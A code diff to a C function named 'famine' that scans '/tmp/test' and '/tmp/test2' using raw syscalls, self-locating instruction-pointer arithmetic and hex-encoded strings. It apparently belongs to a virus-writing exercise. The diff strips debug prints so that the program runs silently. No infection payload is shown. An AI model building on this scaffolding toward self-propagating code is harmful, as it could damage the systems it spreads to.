@@ -25,14 +25,12 @@ void famine() {
 	uint64_t	directories[] = {0x7365742f706d742f, 0x0074, 0x7365742f706d742f, 0x003274, 0, 0};
 	char		max_path[513];
 	dirent		*d;
-	uint64_t s = 0x0A6F6C6C6568;
 	profiling	this;
 
 	start_rip -= 0x12;
 	this = get_profiling(start_rip);
 
 	(void)this;
-	write(ret, 1, &s, sizeof(uint64_t));
 
 	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
 		str	dir_name = (str)&directories[dir_index];
@@ -44,13 +42,11 @@ void famine() {
 
 		open(fd, dir_name, O_RDONLY);	
 		if (fd < 0) {
-			printf(FILE_LINE("open(%s) \033[31mfail:\033[0m %ld\n"), dir_name, ret);
 			break;
 		}
 
 		getdents(ret, fd, buff, BUFF_SIZE);
 		if (ret < 0) {
-			printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
 			break;
 		}
 
@@ -78,9 +74,6 @@ void famine() {
 			}
 
 			getdents(ret, fd, buff, BUFF_SIZE);
-			if (ret < 0) {
-				printf(FILE_LINE("gedents() \033[31mfail:\033[0m %ld\n"), ret);
-			}
 		}
 
 		close(fd);
@@ -89,5 +82,4 @@ void famine() {
 			max_path[i] = 0;
 	}
 
-	write(ret, 1, &s, sizeof(uint64_t));
 }
